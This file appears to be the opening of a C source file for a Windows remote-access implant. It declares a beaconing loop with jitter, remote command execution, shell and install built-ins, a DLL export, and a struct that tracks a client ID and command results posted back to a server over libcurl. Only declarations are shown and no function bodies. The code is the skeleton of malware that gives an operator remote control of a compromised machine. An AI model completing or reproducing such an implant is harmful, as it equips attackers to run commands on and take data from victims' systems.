#include "common.h"
#include <string.h>
#include <Windows.h>

#include "linkedlist.h"
#include "commandnode.h"
#include "base64.h"

#define CURL_STATICLIB
#include "..\..\tinycurl\include\curl\curl.h"

// Library for MessageBox
#pragma comment(lib, "user32.lib")

// Libraries needed for tinycurl
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "normaliz.lib")
#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "wldap32.lib")
#pragma comment(lib, "..\\..\\tinycurl\\lib\\libcurl_a.lib")

// Function declarations
int   main(void);
void  jitter_connect(void);
void  command_loop(void);
char* execute_command(const char *cmd);
void  update_curl_headers(void);
char* make_header(const char* header, const char* data);
__declspec(dllexport) void MainExport(void);

// Built-in functions
char* CMD_exec(char* args);
char* CMD_shell(char* args);
char* CMD_gogo(char* args);
char* CMD_quit(char* args);
char* CMD_install(char* args);

typedef struct {
    LinkedList* commandList; // Commands the client knows how to execute (including built-ins)
    // The headers that will be sent back to the server, will include key and value
    char* header_command;   // Header key
    char* header_commands;  // Header key for sending commandList, ie "Commands: "
    char* header_clientid;  // Header key for the clients ID.

    // The header values
    char* data_command;     // Command the client executed
    char* data_commands;    // Header value of commandList
    char* data_clientid;    // Header value of clients ID.

    // The curl POST body
    char* data_response;    // Command results to send back to server

    // Actual curl header struct
    struct curl_slist* client_headers;  
} CommandStruct;